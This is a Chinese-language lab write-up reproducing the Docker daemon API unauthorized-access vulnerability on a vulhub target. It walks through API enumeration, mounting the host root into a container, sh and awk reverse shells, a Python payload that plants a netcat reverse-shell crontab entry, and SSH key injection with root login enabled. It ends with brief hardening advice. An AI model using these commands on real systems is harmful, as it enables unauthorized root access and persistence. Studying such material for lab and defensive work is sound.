---
title: docker 未授权访问漏洞
tags:
  - 渗透测试
  - docker
  - vulhub
creation date: 2024-04-16
done: true
---
# 1. docker 相关介绍  
---
Docker 是一种开源的容器化技术，它允许开发者将应用程序及其依赖打包到一个可移植的容器中，然后发布到任何流行的 Linux 机器或 Windows 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。  

# 1.1 docker 组成部分  
1. **image**：镜像，Docker 容器的模板，包含了运行应用程序所需的所有文件、库、环境变量和配置。  
2. **containers**：容器，容器是 Docker 镜像的运行实例。  
3. **daemon**：守护进程
	- 管理 docker 对象，负责创建、启动、停止和删除 Docker 容器、镜像、网络等。  
	- 处理 docker API 请求请求。  
	- 维护 docker 环境，包括容器的运行状态、网络配置、存储卷等。  
	- 安全性，配置使用 TLS 加密，以保护 Docker API 的通信安全。  
docker 运行的默认端口为 `2375`  

## 1.2 docker 安装  
[Install Docker Engine | Docker Docs](https://docs.docker.com/engine/install/)  

## 1.3 docker daemon api 未授权访问漏洞  
Docker 守护进程默认监听在 Unix 套接字（通常是 `/var/run/docker.sock`）上，这意味着任何在系统上有权限的用户都可以通过这个套接字与 Docker 守护进程通信，从而执行各种操作，包括创建、启动、停止容器，甚至是获取系统权限。如果 Docker 守护进程配置为监听 TCP/IP 套接字，并且没有启用 TLS 加密，那么攻击者就可以通过网络直接访问 Docker 守护进程，进行未授权操作。  

# 2. 漏洞复现  
---
使用环境为 vulhub 的 docker daemon api 未授权访问漏洞：[Vulhub - Docker-Compose file for vulnerability environment](https://vulhub.org/#/environments/docker/unauthorized-rce/)  
> [!tip]
> 在执行 `docker compose --build` 的过程中，可能会出现如下报错：  `Error starting daemon: Devices cgroup isn't mounted`，可以访问 [docker之cgroup版本问题 - 蚁景网络安全](https://zhuanlan.zhihu.com/p/679399083) 进行解决。  

成功运行：
![docker compose ps](https://image.yiscook.top/blog-image/202404170058607.png)  

## 2.1 环境介绍  
- 靶机环境：docker v26（安装在 kali，ip：`192.168.88.130`）  
	docker 镜像：vulhub/docker:18.03.0，暴露端口： 2375  
	可以当靶场运行起来后，手动进入镜像中，拉取一些镜像并启动，例如：centos，alpine。方便后续的利用和学习。
- 攻击环境：kali

# 3. docker daemon api 未授权访问漏洞利用 
---
## 3.1 docker 信息获取    
### 3.1.1 通过 API 获取信息
docker 官方 api 文档：[Develop with Docker Engine API | Docker Docs](https://docs.docker.com/engine/api/#api-version-matrix)  
此处仅介绍比较常用的 api：  
1. 获取系统信息：`http://192.168.88.130:2375/info`  
	可获取到：`Containers` 容器总数，`Images` 镜像总数，`OperatingSystem` 主机操作系统名称等  
	![api-info](https://image.yiscook.top/blog-image/202404171709738.png)    
	如图：容器共 2 个，镜像共 2 个  
2.  获取版本信息：`http://192.168.88.130:2375/version`  
3. 列出所有容器：`http://192.168.88.130:2375/containers/json`  
	![api-containers/json](https://image.yiscook.top/blog-image/202404171713937.png)  
4. 检查指定容器：`http://192.168.88.130:2375/containers/{id}/json`  
5. 列出指定容器内运行的进程：`http://192.168.88.130:2375/containers/{id}/top`  
	1. ![api-containers/id/top](https://image.yiscook.top/blog-image/202404171714246.png)  
6. 获取指定容器日志：`http://192.168.88.130:2375/containers/{id}/logs`  
7. 列出所有镜像：`http://192.168.88.130:2375/images/json`  
	![api-images/json](https://image.yiscook.top/blog-image/202404171717762.png)  
8. 检查指定镜像：`http://192.168.88.130:2375/images/{name}/json`  
	![api-images/name/json](https://image.yiscook.top/blog-image/202404171719226.png)  

### 3.1.2 通过 docker 命令获取信息    
此处最好有一个公网的 vps，并且部署好了 vps 环境。可以使用 `docker -H tcp://<target-ip>:<port> [docker-command]` 进行利用。  
1. 查看镜像：`docker -H tcp://192.168.88.130:2375 images`
	![-H images](https://image.yiscook.top/blog-image/202404171720720.png)  
2. 查看容器：`docker -H tcp://192.168.88.130:2375 ps -a`
	![-H ps -a](https://image.yiscook.top/blog-image/202404171722369.png)  

## 3.2 docker 主机磁盘挂载  
使用 docker 命令创建一个容器，并将主机的磁盘挂载到容器中。
1. 先执行查看镜像，我想将靶场 vulhub/docker: 18.03 的根目录挂载到 centos 的容器中。  
2. 构造 payload：
	```shell
	# docker -H tcp://<ip>:<port> run -it -v /:/mnt <IMAGE-ID> /bin/bash
	docker -H tcp://192.168.88.130:2375 run -it -v /:/mnt 5d0da3dc9764 /bin/bash
	```
	![docker payload](https://image.yiscook.top/blog-image/202404171743946.png)  
	可以看到执行挂载并且启动了容器后，当前登录用户为 `root`，容器系统为 `centos`；并且成功挂载了，路径为：`/mnt/`，查看挂载的系统为 `alpine`，也就是 vulhub/docker: 18.03，使用的系统是 Alpine linux。  

### 3.2.1 sh 或者 awk 反弹 shell  
1. sh 反弹shell  
	payload：
	```shell
	sh -i >& /dev/tcp/192.168.88.130/9001 0>&1
	```
	在攻击端开启监听：`nc -lvnp 9001`，成功监听，结果如下：
	![sh-反弹shell](https://image.yiscook.top/blog-image/202404171756290.png)  

2. awk 反弹shell  
	payload：
	```shell
	awk 'BEGIN {s = "/inet/tcp/0/192.168.88.130/9001"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
	```
	在攻击端开启监听：`nc -lvnp 9001`，成功监听，结果如下：  
	![awk-反弹shell](https://image.yiscook.top/blog-image/202404171800080.png)

### 3.2.2 crontab 定时任务反弹 shell  
此处可以使用 vulhub 给出的 payload 进行利用：
```python
import docker

client = docker.DockerClient(base_url='http://target-ip:2375/')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
```
1. 将 `target-ip` 更换为存在 docker 服务的目标 ip 地址，`your-ip` 更换为开启监听的 ip 地址  
2. 运行 `alpine:latest` 这一指定的容器镜像  
3. 挂载主机的 `/etc` 目录到容器内的 `/tmp/etc` 目录，设置为读写模式：`volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}}`
4. 在容器中执行 `sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root"` shell 命令，并且添加到定时任务中，目的是反弹 shell 到开启监听指定 ip 地址的 21 端口  
5. 容器运行后自动删除，`remove=True`  
![payload-result](https://image.yiscook.top/blog-image/202404301759484.png)  
可以看到已经成功写入了定时任务。  
如果该指令没有执行，可能是 crontab 服务没有及时刷新。  

### 3.2.3 写入公钥  
因靶场并没有使用到 ssh 服务，所以这部分记录一下提供思路。  
1. 将存在未授权访问漏洞的 docker 目标的根目录挂载到 busybox 的/mnt 目录下。（选用 busybox 命令比较齐全）：  
	-  `--rm`：容器停止时，自动删除该容器  
	- `–privileged`：container 内的 root 拥有真正的 root 权限。否则，container 内的 root 只是外部的一个普通用户权限。privileged 启动的容器，可以看到很多 host 上的设备，并且可以执行 mount。甚至允许你在 docker 容器中启动 docker 容器。  
	- `chroot`：将根目录切换到 `/mnt` 下  
	```shell
	docker -H tcp://target-ip run --rm --privileged -it -v /:/mnt busybox chroot /mnt sh
	```
2. 修改 ssh 相关的配置文件，并重启 ssh 服务：  
	```shell
	sed -i -e ‘s/\#Port 22/Port 22/g’ -e ‘/^Port 22/a\Port 2433’ -e ‘s/\#PermitRootLogin/PermitRootLogin/g’ -e ‘s/PermitRootLogin no/PermitRootLogin yes/g’ -e ‘s/PermitRootLogin without-password/PermitRootLogin yes/g’ -e ‘s/PermitRootLogin prohibit-password/PermitRootLogin yes/g’ -e ‘s/PasswordAuthentication no/PasswordAuthentication yes/g’ -e ‘s/GSSAPIAuthentication yes/GSSAPIAuthentication no/g’ -e ‘s/GSSAPICleanupCredentials yes/GSSAPICleanupCredentials no/g’ /etc/ssh/sshd_config
	
	systemctl restart sshd
	```
3. 修改 /root/.ssh/authorized_keys 文件的属性限制，使其可被修改等操作：  
	```shell
	chattr -aui /root/.ssh/authorized_keys
	```
4. 写入已经生成的公钥内容：  
	```shell
	echo "your-id_rsa.pub" > authorized_keys
	```
5. 尝试进行连接：  
	```shell
	ssh -i id_rsa root@target-ip
	```

# 4. docker 配置文件  
---
有关 docker 的配置文件有：`docker.service`、`docker.socket` 以及 `daemon.json`，其详解可以查看：[【Docker】专题五：Docker 配置文件详解 - 知乎](https://zhuanlan.zhihu.com/p/690360670)  
对于 docker daemon api 的未授权访问漏洞，需主要关注 `daemon.json` 中的 `hosts` 以及 `docker.service` 中的 `ExecStart`。  
最好仅接受指定 ip 的远程访问，不要设置成 `0.0.0.0`，监听端口也可以尝试进行修改。  
